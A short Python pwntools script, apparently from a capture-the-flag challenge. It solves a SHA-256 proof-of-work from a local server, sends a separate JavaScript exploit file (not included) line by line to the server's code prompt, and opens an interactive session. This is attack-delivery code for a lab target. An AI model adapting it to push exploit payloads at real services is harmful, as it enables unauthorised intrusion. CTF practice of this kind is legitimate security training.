#!/usr/bin/env python
import string
from pwn import *
from hashlib import sha256
context.log_level = "debug"

dic = string.ascii_letters + string.digits

DEBUG = 0

def solvePow(prefix,h):
    for a1 in dic:
        for a2 in dic:
            for a3 in dic:
                for a4 in dic:
                    x = a1 + a2 + a3 + a4
                    proof = x + prefix.decode("utf-8")
                    _hexdigest = sha256(proof.encode()).hexdigest()
                    if _hexdigest == h.decode("utf-8"):
                            return x

r = remote("127.0.0.1",9998)

r.recvuntil("sha256(XXXX+")
prefix = r.recvuntil(") == ", drop = True)
h = r.recvuntil("\n", drop = True)
result = solvePow(prefix,h)
r.sendlineafter("Give me XXXX:",result)

data = open("./exp.js","r").read()
data = data.split("\n")
for i in data:
    if i == "":
        continue
    r.sendlineafter("code> ",i)
r.sendlineafter("code> ","EOF")

r.interactive()

